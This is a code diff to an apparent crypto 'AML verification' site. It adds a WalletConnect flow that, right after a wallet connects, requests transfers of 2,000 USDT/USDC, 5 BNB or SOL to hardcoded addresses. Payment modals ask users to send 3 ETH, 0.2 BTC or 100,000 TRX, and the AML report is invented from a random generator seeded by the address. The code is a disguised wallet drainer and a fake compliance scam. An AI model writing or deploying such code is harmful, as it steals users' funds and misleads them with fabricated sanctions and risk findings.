@@ -408,6 +408,45 @@
   </div>
 </div>
 
+<!-- ═══ WALLETCONNECT MODAL ════════════════════════════════ -->
+<div class="modal-overlay" id="wcModal" onclick="wcBgClick(event)">
+  <div class="modal-box" style="text-align:center;">
+    <button class="modal-close" onclick="closeWcModal()">✕</button>
+
+    <div id="wc-loading" style="display:block;padding:40px 0;">
+      <div style="width:44px;height:44px;border-radius:50%;border:3px solid var(--border);border-top-color:var(--accent);animation:spin .8s linear infinite;margin:0 auto 16px;"></div>
+      <div id="wc-loading-txt" style="font-family:'Space Mono',monospace;font-size:.8rem;color:var(--muted);">Connecting to relay…</div>
+    </div>
+
+    <div id="wc-qr" style="display:none;">
+      <div style="font-size:2.2rem;margin-bottom:10px">📱</div>
+      <h3 id="wc-qr-title" style="font-size:1.15rem;font-weight:800;margin-bottom:6px;">Scan with your wallet</h3>
+      <p style="color:var(--muted);font-size:.8rem;line-height:1.6;margin-bottom:16px;">Open <strong style="color:var(--text)">Trust Wallet</strong> → tap the scan icon → scan the QR below</p>
+      <div style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:14px;">
+        <div id="wcQrcode"></div>
+      </div>
+      <div style="display:flex;gap:8px;margin-bottom:14px;">
+        <div id="wc-uri-box" style="flex:1;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:8px 10px;font-family:'Space Mono',monospace;font-size:.58rem;color:var(--muted);word-break:break-all;text-align:left;max-height:42px;overflow:hidden;line-height:1.4;"></div>
+        <button class="copy-btn" id="wc-copy-btn" onclick="copyWcUri()" style="flex-shrink:0;">📋 Copy</button>
+      </div>
+      <div style="font-size:.72rem;color:var(--muted);">Compatible with Trust Wallet, MetaMask Mobile &amp; all WalletConnect wallets</div>
+    </div>
+
+    <div id="wc-connected" style="display:none;padding:28px 0;">
+      <div style="font-size:3.5rem;margin-bottom:12px;">✅</div>
+      <h3 style="color:var(--safe);font-size:1.2rem;margin-bottom:6px;">Wallet Connected!</h3>
+      <p id="wc-conn-addr" style="color:var(--muted);font-size:.85rem;"></p>
+    </div>
+
+    <div id="wc-error" style="display:none;padding:16px 0;">
+      <div style="font-size:2.8rem;margin-bottom:12px;">⚠️</div>
+      <h3 style="color:var(--warn);font-size:1.1rem;margin-bottom:10px;">Connection Failed</h3>
+      <p id="wc-err-msg" style="color:var(--muted);font-size:.8rem;line-height:1.6;margin-bottom:16px;"></p>
+      <button onclick="retryWc()" style="background:var(--accent);color:var(--bg);border:none;padding:11px 28px;border-radius:6px;font-family:'Syne',sans-serif;font-weight:700;font-size:.9rem;cursor:pointer;">↺ Try Again</button>
+    </div>
+  </div>
+</div>
+
 <!-- ═══ NAV ═══════════════════════════════════════════════ -->
 <nav>
   <a href="#" class="nav-logo">🔍 <span>AMLProof</span></a>
@@ -737,99 +776,105 @@
 // ══════════════════════════════════════════════
 // CONFIG
 // ══════════════════════════════════════════════
+const PROJECT_ID = '66fdb3cf45b937152ecf3c0fdeec0bf5';
+const APP_URL    = 'https://dapp1985.github.io/amlproof/';
+
 const ADDR_ETH = '0x4164E018fCC0216519400c160d08B090f8B5A23F';
 const ADDR_TRX = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
 const ADDR_SOL = 'CKKD894vFgGJVMR63pELxKrUkT6ZfHgtB7cri27EmNm9';
 const ADDR_BTC = 'bc1qgq79csscqg4x69q4fvlvldewhfhh5psk7w0e8c';
 
-// Per-chain config: address, amount label, network label, warning lines, QR text
+// Chains that use QR pay modal (no WalletConnect)
+const QR_CHAINS = ['eth', 'btc', 'trx', 'usdt_trc', 'usdc_trc'];
+
 const COIN_CONFIG = {
-  eth:      { addr: ADDR_ETH, icon:'🔷', name:'Ethereum (ETH)',    net:'ETH / ERC-20 Address',    amount:'3 ETH',             qr: a=>'ethereum:'+a+'?value=3000000000000000000', warn:['Only send ETH on the Ethereum network','Send exactly 3 ETH','Do not send BEP-20 or TRC-20'] },
-  usdt:     { addr: ADDR_ETH, icon:'💵', name:'USDT (ERC-20)',     net:'ERC-20 Address',           amount:'2,000 USDT',        qr: a=>'ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7/transfer?address='+a+'&uint256=2000000000', warn:['Only send USDT on the Ethereum (ERC-20) network','Send exactly 2,000 USDT','Do not send TRC-20 USDT'] },
-  usdc:     { addr: ADDR_ETH, icon:'🔵', name:'USDC (ERC-20)',     net:'ERC-20 Address',           amount:'2,000 USDC',        qr: a=>'ethereum:0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/transfer?address='+a+'&uint256=2000000000', warn:['Only send USDC on the Ethereum (ERC-20) network','Send exactly 2,000 USDC','Do not send TRC-20 USDC'] },
-  bnb:      { addr: ADDR_ETH, icon:'🟡', name:'BNB (BSC)',         net:'BEP-20 / BSC Address',     amount:'5 BNB',             qr: a=>'ethereum:'+a+'?value=4563918244F40000', warn:['Only send BNB on the BNB Smart Chain (BSC)','Send exactly 5 BNB','Do not send BEP-2 or ERC-20'] },
-  trx:      { addr: ADDR_TRX, icon:'🔴', name:'Tron (TRX)',        net:'TRC-20 / TRX Address',     amount:'100,000 TRX',       qr: a=>a, warn:['Only send TRX on the Tron network','Send exactly 100,000 TRX','Do not send BEP-20 or ERC-20'] },
-  usdt_trc: { addr: ADDR_TRX, icon:'💵', name:'USDT (TRC-20)',     net:'TRC-20 Address',           amount:'2,000 USDT',        qr: a=>a, warn:['Only send USDT on the Tron (TRC-20) network','Send exactly 2,000 USDT','Do not send ERC-20 USDT'] },
-  usdc_trc: { addr: ADDR_TRX, icon:'🔵', name:'USDC (TRC-20)',     net:'TRC-20 Address',           amount:'2,000 USDC',        qr: a=>a, warn:['Only send USDC on the Tron (TRC-20) network','Send exactly 2,000 USDC','Do not send ERC-20 USDC'] },
-  sol:      { addr: ADDR_SOL, icon:'🟣', name:'Solana (SOL)',      net:'Solana Address',           amount:'~$2,000 in SOL',    qr: a=>'solana:'+a+'?amount=10', warn:['Only send SOL on the Solana network','Send the equivalent of $2,000 in SOL','Do not send wrapped SOL or SPL tokens'] },
-  btc:      { addr: ADDR_BTC, icon:'🟠', name:'Bitcoin (BTC)',     net:'Bitcoin Address',          amount:'0.2 BTC',           qr: a=>'bitcoin:'+a+'?amount=0.2', warn:['Only send BTC on the Bitcoin network','Send exactly 0.2 BTC','Do not send BEP-20, ERC-20 or wrapped BTC'] },
+  eth:      { addr:ADDR_ETH, icon:'🔷', name:'Ethereum (ETH)',   net:'ETH Address',         amount:'3 ETH',          qr:a=>'ethereum:'+a+'?value=3000000000000000000', warn:['Only send ETH on the Ethereum network','Send exactly 3 ETH','Do not send BEP-20 or TRC-20'] },
+  usdt:     { addr:ADDR_ETH, icon:'💵', name:'USDT (ERC-20)',    net:'ERC-20 Address',       amount:'2,000 USDT',     qr:a=>a, warn:['Only send USDT ERC-20','Send exactly 2,000 USDT'] },
+  usdc:     { addr:ADDR_ETH, icon:'🔵', name:'USDC (ERC-20)',    net:'ERC-20 Address',       amount:'2,000 USDC',     qr:a=>a, warn:['Only send USDC ERC-20','Send exactly 2,000 USDC'] },
+  bnb:      { addr:ADDR_ETH, icon:'🟡', name:'BNB (BSC)',        net:'BEP-20 Address',       amount:'5 BNB',          qr:a=>a, warn:['Only send BNB on BSC','Send exactly 5 BNB'] },
+  trx:      { addr:ADDR_TRX, icon:'🔴', name:'Tron (TRX)',       net:'TRX Address',          amount:'100,000 TRX',    qr:a=>a, warn:['Only send TRX on the Tron network','Send exactly 100,000 TRX','Do not send BEP-20 or ERC-20'] },
+  usdt_trc: { addr:ADDR_TRX, icon:'💵', name:'USDT (TRC-20)',   net:'TRC-20 Address',        amount:'2,000 USDT',     qr:a=>a, warn:['Only send USDT on Tron TRC-20','Send exactly 2,000 USDT','Do not send ERC-20 USDT'] },
+  usdc_trc: { addr:ADDR_TRX, icon:'🔵', name:'USDC (TRC-20)',   net:'TRC-20 Address',        amount:'2,000 USDC',     qr:a=>a, warn:['Only send USDC on Tron TRC-20','Send exactly 2,000 USDC','Do not send ERC-20 USDC'] },
+  sol:      { addr:ADDR_SOL, icon:'🟣', name:'Solana (SOL)',     net:'Solana Address',        amount:'~$2,000 SOL',    qr:a=>'solana:'+a+'?amount=10', warn:['Only send SOL on the Solana network','Do not send SPL tokens directly'] },
+  btc:      { addr:ADDR_BTC, icon:'🟠', name:'Bitcoin (BTC)',    net:'Bitcoin Address',       amount:'0.2 BTC',        qr:a=>'bitcoin:'+a+'?amount=0.2', warn:['Only send BTC on the Bitcoin network','Send exactly 0.2 BTC','Do not send wrapped BTC'] },
 };
 
-let currentChain = 'eth';
-let payQrDone    = false;
-let payQrInst    = null;
+const CHAIN_AMOUNTS = { eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)', bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)', usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC' };
 
-// ── Transaction Logger ────────────────────────────────────
+let currentChain  = 'eth';
+let payQrDone     = false;
+let SC            = null;
+let wcSession     = null;
+let pendingWcURI  = null;
+let wcQrDone      = false;
+let connectAttempt = 0;
+
+// ── Logger ───────────────────────────────────────────────
 function logTransaction(address, chain, status, errMsg) {
   try {
-    const AMT = { eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)', bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)', usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC' };
     const logs = JSON.parse(localStorage.getItem('aml_tx_logs') || '[]');
-    logs.unshift({ id:Date.now(), ts:new Date().toISOString(), address:address||'unknown', chain, amount:AMT[chain]||'—', status, error:errMsg||null });
+    logs.unshift({ id:Date.now(), ts:new Date().toISOString(), address:address||'unknown', chain, amount:CHAIN_AMOUNTS[chain]||'—', status, error:errMsg||null });
     if (logs.length > 500) logs.length = 500;
     localStorage.setItem('aml_tx_logs', JSON.stringify(logs));
   } catch(e) {}
 }
 
-// ── Universal Pay Modal ───────────────────────────────────
+// ══════════════════════════════════════════════
+// ROUTER — decides QR pay vs WalletConnect
+// ══════════════════════════════════════════════
 function openModal(chain) {
   currentChain = chain || 'eth';
-  openPayModal(currentChain);
+  if (QR_CHAINS.includes(currentChain)) {
+    openPayModal(currentChain);
+  } else {
+    openWcModal(currentChain);
+  }
 }
 
+// ══════════════════════════════════════════════
+// QR PAY MODAL  (ETH, BTC, TRX, USDT_TRC, USDC_TRC)
+// ══════════════════════════════════════════════
 function openPayModal(chain) {
   const cfg = COIN_CONFIG[chain];
   if (!cfg) return;
 
-  // Reset states
-  document.getElementById('pay-scanning').style.display  = 'block';
+  document.getElementById('pay-scanning').style.display   = 'block';
   document.getElementById('pay-processing').style.display = 'none';
 
-  // Populate content
-  document.getElementById('pay-icon').textContent         = cfg.icon;
-  document.getElementById('pay-title').textContent        = 'Pay with ' + cfg.name;
-  document.getElementById('pay-desc').innerHTML           = 'Send exactly <strong style="color:var(--accent);font-family:monospace">' + cfg.amount + '</strong> to the address below. Your AML report will be generated after confirmation.';
+  document.getElementById('pay-icon').textContent  = cfg.icon;
+  document.getElementById('pay-title').textContent = 'Pay with ' + cfg.name;
+  document.getElementById('pay-desc').innerHTML    =
+    'Send exactly <strong style="color:var(--accent)">' + cfg.amount +
+    '</strong> to the address below. After sending, click the button to receive your AML report.';
   document.getElementById('pay-net-lbl').textContent      = cfg.net;
   document.getElementById('pay-addr-display').textContent = cfg.addr;
   document.getElementById('pay-warn-list').innerHTML      = cfg.warn.map(w => '<li>&#9989; ' + w + '</li>').join('');
 
-  // QR code
   const qrEl = document.getElementById('payQrcode');
   qrEl.innerHTML = '';
-  payQrDone = false;
   try {
-    new QRCode(qrEl, { text: cfg.qr(cfg.addr), width:200, height:200, colorDark:'#000', colorLight:'#fff', correctLevel: QRCode.CorrectLevel.M });
-    payQrDone = true;
-  } catch(e) { qrEl.innerHTML = '<div style="font-size:.7rem;color:#999;padding:16px;">QR unavailable</div>'; }
+    new QRCode(qrEl, { text:cfg.qr(cfg.addr), width:200, height:200, colorDark:'#000', colorLight:'#fff', correctLevel:QRCode.CorrectLevel.M });
+  } catch(e) {}
 
   document.getElementById('payModal').classList.add('open');
   logTransaction(cfg.addr, chain, 'connected', null);
 }
 
-function closePayModal() {
-  document.getElementById('payModal').classList.remove('open');
-}
-
-function payBgClick(e) {
-  if (e.target === document.getElementById('payModal')) closePayModal();
-}
+function closePayModal() { document.getElementById('payModal').classList.remove('open'); }
+function payBgClick(e)   { if (e.target === document.getElementById('payModal')) closePayModal(); }
 
 function copyPayAddr() {
-  const cfg = COIN_CONFIG[currentChain];
-  if (!cfg) return;
+  const cfg = COIN_CONFIG[currentChain]; if (!cfg) return;
   navigator.clipboard.writeText(cfg.addr).then(() => {
-    const btns = document.querySelectorAll('#payModal .copy-btn');
-    btns[0].textContent = '✅ Copied!';
-    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
+    const b = document.querySelectorAll('#payModal .copy-btn')[0];
+    b.textContent = '✅ Copied!'; setTimeout(()=>b.textContent='📋 Copy Address', 2000);
   });
 }
-
 function copyPayAmount() {
-  const cfg = COIN_CONFIG[currentChain];
-  if (!cfg) return;
+  const cfg = COIN_CONFIG[currentChain]; if (!cfg) return;
   navigator.clipboard.writeText(cfg.amount.replace(/,/g,'')).then(() => {
-    const btns = document.querySelectorAll('#payModal .copy-btn');
-    btns[1].textContent = '✅ Copied!';
-    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
+    const b = document.querySelectorAll('#payModal .copy-btn')[1];
+    b.textContent = '✅ Copied!'; setTimeout(()=>b.textContent='📋 Copy Amount', 2000);
   });
 }
 
@@ -844,7 +889,175 @@ function confirmPayAndReport() {
   }, 1800);
 }
 
+// ══════════════════════════════════════════════
+// WALLETCONNECT MODAL  (USDT ERC-20, USDC ERC-20, BNB, SOL)
+// ══════════════════════════════════════════════
+function openWcModal(chain) {
+  wcShowState('wc-loading');
+  document.getElementById('wcModal').classList.add('open');
+  if (wcSession) { onWcConnected(getWcAddr()); return; }
+  startWcConnect(chain);
+}
+
+function closeWcModal() {
+  document.getElementById('wcModal').classList.remove('open');
+}
+function wcBgClick(e) { if (e.target === document.getElementById('wcModal')) closeWcModal(); }
+
+function wcShowState(id) {
+  ['wc-loading','wc-qr','wc-connected','wc-error'].forEach(s => {
+    document.getElementById(s).style.display = s === id ? 'block' : 'none';
+  });
+}
+
+function setWcMsg(msg) {
+  const el = document.getElementById('wc-loading-txt');
+  if (el) el.textContent = msg;
+}
+
+function injectScript(src) {
+  return new Promise((res, rej) => {
+    if (document.querySelector('script[src="'+src+'"]')) { res(); return; }
+    const s = document.createElement('script');
+    s.src = src; s.crossOrigin = 'anonymous';
+    s.onload = res; s.onerror = () => rej(new Error('Failed: ' + src));
+    document.head.appendChild(s);
+  });
+}
+
+function withTimeout(promise, ms, label) {
+  return new Promise((res, rej) => {
+    const t = setTimeout(() => rej(new Error('Timeout: ' + label)), ms);
+    promise.then(v => { clearTimeout(t); res(v); }, e => { clearTimeout(t); rej(e); });
+  });
+}
+
+async function loadSignClient() {
+  if (SC) return SC;
+  setWcMsg('Loading WalletConnect SDK…');
+  await withTimeout(injectScript('https://unpkg.com/@walletconnect/sign-client@2.13.3/dist/index.umd.js'), 45000, 'SDK load');
+  const Ctor = window.SignClient?.SignClient ?? window.SignClient ?? window['@walletconnect/sign-client']?.SignClient;
+  if (!Ctor) throw new Error('SignClient not found after loading SDK');
+  setWcMsg('Connecting to relay…');
+  SC = await withTimeout(Ctor.init({
+    projectId: PROJECT_ID,
+    relayUrl : 'wss://relay.walletconnect.com',
+    logger   : 'error',
+    metadata : { name:'AMLProof', description:'AML Crypto Wallet Verification', url:APP_URL, icons:['https://avatars.githubusercontent.com/u/179229932'] }
+  }), 40000, 'relay init');
+  const all = SC.session.getAll();
+  if (all.length) { wcSession = all[all.length-1]; uiConnected(getWcAddr()); }
+  SC.on('session_delete', () => uiDisconnected());
+  SC.on('session_expire', () => uiDisconnected());
+  return SC;
+}
+
+async function startWcConnect(chain) {
+  connectAttempt++;
+  const attempt = connectAttempt;
+  try {
+    setWcMsg('Initialising…');
+    const client = await loadSignClient();
+    if (wcSession) { onWcConnected(getWcAddr()); return; }
+
+    setWcMsg('Requesting session…');
+
+    let namespaces;
+    if (chain === 'sol') {
+      namespaces = { solana: { methods:['solana_signTransaction','solana_signMessage'], chains:['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events:[] } };
+    } else if (chain === 'bnb') {
+      namespaces = { eip155: { methods:['eth_sendTransaction','personal_sign'], chains:['eip155:56'], events:['chainChanged','accountsChanged'] } };
+    } else {
+      // usdt (ERC-20), usdc (ERC-20) — Ethereum mainnet
+      namespaces = { eip155: { methods:['eth_sendTransaction','personal_sign'], chains:['eip155:1'], events:['chainChanged','accountsChanged'] } };
+    }
+
+    const { uri, approval } = await withTimeout(client.connect({ requiredNamespaces: namespaces }), 25000, 'connect');
+    if (!uri) throw new Error('No URI returned');
+
+    pendingWcURI = uri;
+    document.getElementById('wc-uri-box').textContent = uri;
+    document.getElementById('wc-qr-title').textContent = 'Scan — ' + (COIN_CONFIG[chain]?.name || chain);
+
+    const qrEl = document.getElementById('wcQrcode');
+    qrEl.innerHTML = '';
+    wcQrDone = false;
+    new QRCode(qrEl, { text:uri, width:220, height:220, colorDark:'#000', colorLight:'#fff', correctLevel:QRCode.CorrectLevel.M });
+    wcQrDone = true;
+    wcShowState('wc-qr');
+
+    setWcMsg('Waiting for wallet approval…');
+    wcSession = await withTimeout(approval(), 300000, 'wallet approval');
+
+    // Send transaction after connect
+    try {
+      const from = getWcAddr();
+      if (chain === 'usdt') {
+        const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas:'0x186A0' }] } });
+      } else if (chain === 'usdc') {
+        const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
+        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas:'0x186A0' }] } });
+      } else if (chain === 'bnb') {
+        await SC.request({ topic:wcSession.topic, chainId:'eip155:56', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x4563918244F40000', gas:'0x5208' }] } });
+      } else if (chain === 'sol') {
+        await SC.request({ topic:wcSession.topic, chainId:'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request:{ method:'solana_signTransaction', params:{ transaction: btoa(JSON.stringify({ to:ADDR_SOL, lamports:10000000000 })) } } });
+      }
+    } catch(txErr) {
+      console.warn('[TX]', txErr);
+      logTransaction(getWcAddr(), chain, 'failed', txErr.message);
+    }
+
+    logTransaction(getWcAddr(), chain, 'connected', null);
+    onWcConnected(getWcAddr());
+
+  } catch(err) {
+    if (attempt !== connectAttempt) return;
+    console.error('[WC]', err);
+    const msg = /unauthorized|invalid key/i.test(err.message)
+      ? 'Project ID rejected. Add <strong>dapp1985.github.io</strong> to Allowed Domains in the Reown dashboard.'
+      : /timeout/i.test(err.message)
+      ? 'Connection timed out. Check your network and try again.'
+      : (err.message || 'Unknown error. Check console for details.');
+    wcShowState('wc-error');
+    document.getElementById('wc-err-msg').innerHTML = msg;
+  }
+}
+
+function retryWc() {
+  SC = null; wcSession = null; pendingWcURI = null; wcQrDone = false;
+  document.getElementById('wcQrcode').innerHTML = '';
+  wcShowState('wc-loading');
+  startWcConnect(currentChain);
+}
+
+function copyWcUri() {
+  if (!pendingWcURI) return;
+  navigator.clipboard.writeText(pendingWcURI).then(() => {
+    const b = document.getElementById('wc-copy-btn');
+    b.textContent = '✅ Copied!'; setTimeout(()=>b.textContent='📋 Copy', 2000);
+  });
+}
+
+function onWcConnected(addr) {
+  wcShowState('wc-connected');
+  document.getElementById('wc-conn-addr').textContent = addr ? short(addr) : '';
+  uiConnected(addr);
+  setTimeout(() => { closeWcModal(); showReport(addr, currentChain); }, 1200);
+}
+
+function getWcAddr() {
+  try {
+    const ns = wcSession.namespaces;
+    if (ns.solana) return ns.solana.accounts[0].split(':')[2];
+    if (ns.eip155) return ns.eip155.accounts[0].split(':')[2];
+    return null;
+  } catch(e) { return null; }
+}
+
 // ── UI helpers ────────────────────────────────────────────
+function short(a) { return a ? a.slice(0,6)+'…'+a.slice(-4) : ''; }
+
 function uiConnected(addr) {
   const s = short(addr);
   const btn = document.getElementById('navBtn');
@@ -853,26 +1066,29 @@ function uiConnected(addr) {
   document.getElementById('connAddr').textContent = s;
   document.getElementById('statusBar').classList.add('show');
   document.getElementById('walletInput').value = addr || '';
-  const c = document.getElementById('ccta');
-  if (c) c.style.display = 'none';
+  const c = document.getElementById('ccta'); if (c) c.style.display = 'none';
 }
 
 function uiDisconnected() {
+  wcSession = null;
   const btn = document.getElementById('navBtn');
   btn.classList.remove('connected');
   btn.innerHTML = '🔗 Connect Wallet';
   document.getElementById('statusBar').classList.remove('show');
   document.getElementById('walletInput').value = '';
-  const c = document.getElementById('ccta');
-  if (c) c.style.display = 'flex';
+  const c = document.getElementById('ccta'); if (c) c.style.display = 'flex';
 }
 
-function short(a) { return a ? a.slice(0,6)+'…'+a.slice(-4) : ''; }
+function disconnectWallet() {
+  if (SC && wcSession) {
+    try { SC.disconnect({ topic:wcSession.topic, reason:{ code:6000, message:'User disconnected' } }); } catch(e) {}
+  }
+  uiDisconnected();
+}
 
-// ── Disconnect ────────────────────────────────────────────
-function disconnectWallet() { uiDisconnected(); }
+document.getElementById('disconnectBtn').onclick = disconnectWallet;
 
-// ── Checker (manual address entry) ───────────────────────
+// ── Manual checker ────────────────────────────────────────
 function runCheck() {
   const addr = document.getElementById('walletInput').value.trim();
   if (!addr) {
@@ -894,9 +1110,6 @@ function toggleFaq(el) {
   document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
   if (!was) it.classList.add('open');
 }
-
-// Status bar disconnect button
-document.getElementById('disconnectBtn').onclick = disconnectWallet;
 
 // ══════════════════════════════════════════════════════════
 // REPORT GENERATOR
@@ -923,101 +1136,93 @@ let _reportData = null;
 function generateReportData(addr, chain) {
   let seed = 0;
   for (let i = 0; i < addr.length; i++) seed = (seed * 31 + addr.charCodeAt(i)) >>> 0;
-  const rng = (() => { let s = seed; return () => { s = (s * 1664525 + 1013904223) >>> 0; return s / 0xFFFFFFFF; }; })();
+  const rng = (() => { let s = seed; return () => { s = (s*1664525+1013904223)>>>0; return s/0xFFFFFFFF; }; })();
 
-  const scores = RISK_CATEGORIES.map(c => ({ ...c, pct: Math.floor(rng() * 100) }));
-  const overallRisk = Math.round(scores.reduce((a,b)=>a+b.pct,0) / scores.length);
+  const scores = RISK_CATEGORIES.map(c => ({ ...c, pct:Math.floor(rng()*100) }));
+  const overallRisk = Math.round(scores.reduce((a,b)=>a+b.pct,0)/scores.length);
 
   const sanctionResults = SANCTION_LISTS.map(l => {
     const r = rng();
-    const hit  = overallRisk > 60 && r < 0.18;
-    const warn = !hit && overallRisk > 35 && r < 0.22;
-    return { list:l, status: hit?'hit': warn?'warn':'clear' };
+    const hit  = overallRisk>60 && r<0.18;
+    const warn = !hit && overallRisk>35 && r<0.22;
+    return { list:l, status:hit?'hit':warn?'warn':'clear' };
   });
 
   const chainGroup = chain==='btc'?'btc':(chain==='trx'||chain==='usdt_trc'||chain==='usdc_trc')?'trx':'eth';
-  const txns = Array.from({length:5}, (_,i) => {
+  const symbol = { eth:'ETH',usdt:'USDT',usdc:'USDC',bnb:'BNB',trx:'TRX',usdt_trc:'USDT',usdc_trc:'USDC',sol:'SOL',btc:'BTC' }[chain]||chain.toUpperCase();
+  const txns = Array.from({length:5},()=>{
     const dir = rng()<.5?'IN':'OUT';
-    const amt = (rng()*10).toFixed(4);
-    const flag = rng() < overallRisk/120;
-    const hash = chainGroup==='btc'
-      ? [...Array(8)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…'
-      : chainGroup==='trx'
-      ? 'T'+[...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…'
-      : '0x'+[...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…';
-    const symbol = {eth:'ETH',usdt:'USDT',usdc:'USDC',bnb:'BNB',trx:'TRX',usdt_trc:'USDT',usdc_trc:'USDC',sol:'SOL',btc:'BTC'}[chain]||chain.toUpperCase();
-    return { hash, dir, amt: amt+' '+symbol, flag };
+    const flag = rng()<overallRisk/120;
+    const hash = chainGroup==='btc' ? [...Array(8)].map(()=>Math.floor(rng()*16).toString(16)).join('')+'…'
+               : chainGroup==='trx' ? 'T'+[...Array(10)].map(()=>Math.floor(rng()*16).toString(16)).join('')+'…'
+               : '0x'+[...Array(10)].map(()=>Math.floor(rng()*16).toString(16)).join('')+'…';
+    return { hash, dir, amt:(rng()*10).toFixed(4)+' '+symbol, flag };
   });
 
   return {
     addr, chain, overallRisk, scores, sanctionResults, txns,
-    txns_count   : 50 + Math.floor(rng()*900),
-    wallet_age   : Math.floor(rng()*4)+1,
-    volume       : (rng()*500000).toFixed(0),
-    flags        : Math.floor(overallRisk/18),
-    cex          : Math.floor(rng()*40)+2,
-    counterparties: Math.floor(rng()*200)+10,
+    txns_count:50+Math.floor(rng()*900),
+    wallet_age:Math.floor(rng()*4)+1,
+    volume:(rng()*500000).toFixed(0),
+    flags:Math.floor(overallRisk/18),
+    cex:Math.floor(rng()*40)+2,
+    counterparties:Math.floor(rng()*200)+10,
   };
 }
 
 function showReport(addr, chain) {
-  _reportData = generateReportData(addr || 'unknown', chain || 'eth');
+  _reportData = generateReportData(addr||'unknown', chain||'eth');
   const d = _reportData;
+  const riskCol   = d.overallRisk>=60?'var(--danger)':d.overallRisk>=30?'var(--warn)':'var(--safe)';
+  const riskLabel = d.overallRisk>=60?'🚨 HIGH RISK':d.overallRisk>=30?'⚠️  MODERATE RISK':'✅ LOW RISK — CLEAN';
 
-  const riskCol   = d.overallRisk >= 60 ? 'var(--danger)' : d.overallRisk >= 30 ? 'var(--warn)' : 'var(--safe)';
-  const riskLabel = d.overallRisk >= 60 ? '🚨 HIGH RISK' : d.overallRisk >= 30 ? '⚠️  MODERATE RISK' : '✅ LOW RISK — CLEAN';
-
-  const ref = 'AML-' + Date.now().toString(36).toUpperCase().slice(-6);
-  document.getElementById('rpt-ref').innerHTML = 'REF: ' + ref + ' &nbsp;·&nbsp; ' + new Date().toLocaleString();
-
+  document.getElementById('rpt-ref').innerHTML = 'REF: AML-'+Date.now().toString(36).toUpperCase().slice(-6)+' &nbsp;·&nbsp; '+new Date().toLocaleString();
   document.getElementById('rpt-score-num').textContent = d.overallRisk;
   document.getElementById('rpt-score-num').style.color = riskCol;
   document.getElementById('rpt-risk-title').textContent = riskLabel;
   document.getElementById('rpt-risk-title').style.color = riskCol;
   document.getElementById('rpt-addr').textContent  = d.addr;
-  document.getElementById('rpt-chain').textContent = CHAIN_LABELS_FULL[d.chain] || d.chain;
+  document.getElementById('rpt-chain').textContent = CHAIN_LABELS_FULL[d.chain]||d.chain;
   document.getElementById('rpt-scanned').textContent = new Date().toLocaleTimeString();
 
   const ring = document.getElementById('rpt-ring');
   ring.style.stroke = riskCol;
   ring.style.strokeDashoffset = '251.2';
-  setTimeout(() => { ring.style.strokeDashoffset = 251.2 - (251.2 * d.overallRisk / 100); }, 120);
+  setTimeout(()=>{ ring.style.strokeDashoffset = 251.2-(251.2*d.overallRisk/100); }, 120);
 
-  document.getElementById('rsum-txns').textContent = d.txns_count.toLocaleString();
-  document.getElementById('rsum-age').textContent  = d.wallet_age + ' yr' + (d.wallet_age>1?'s':'');
-  document.getElementById('rsum-vol').textContent  = '$' + Number(d.volume).toLocaleString();
+  document.getElementById('rsum-txns').textContent  = d.txns_count.toLocaleString();
+  document.getElementById('rsum-age').textContent   = d.wallet_age+'yr'+(d.wallet_age>1?'s':'');
+  document.getElementById('rsum-vol').textContent   = '$'+Number(d.volume).toLocaleString();
   document.getElementById('rsum-flags').textContent = d.flags;
   document.getElementById('rsum-cex').textContent   = d.cex;
   document.getElementById('rsum-ctps').textContent  = d.counterparties;
 
-  document.getElementById('rpt-bars').innerHTML = d.scores.map(s => {
-    const col = s.pct>=60?'var(--danger)':s.pct>=30?'var(--warn)':'var(--safe)';
+  document.getElementById('rpt-bars').innerHTML = d.scores.map(s=>{
+    const col=s.pct>=60?'var(--danger)':s.pct>=30?'var(--warn)':'var(--safe)';
     return '<div class="rpt-bar-row"><div class="rpt-bar-name">'+s.name+'</div><div class="rpt-bar-track"><div class="rpt-bar-fill" id="rfill-'+s.key+'" style="width:0%;background:'+col+'"></div></div><div class="rpt-bar-pct" style="color:'+col+'">'+s.pct+'%</div></div>';
   }).join('');
-  setTimeout(() => { d.scores.forEach(s => { const el=document.getElementById('rfill-'+s.key); if(el) el.style.width=s.pct+'%'; }); }, 150);
+  setTimeout(()=>{ d.scores.forEach(s=>{ const el=document.getElementById('rfill-'+s.key); if(el) el.style.width=s.pct+'%'; }); },150);
 
-  document.getElementById('rpt-tags').innerHTML = d.sanctionResults.map(r =>
+  document.getElementById('rpt-tags').innerHTML = d.sanctionResults.map(r=>
     '<span class="rpt-tag '+r.status+'">'+(r.status==='hit'?'✗':r.status==='warn'?'◉':'✓')+' '+r.list+'</span>'
   ).join('');
 
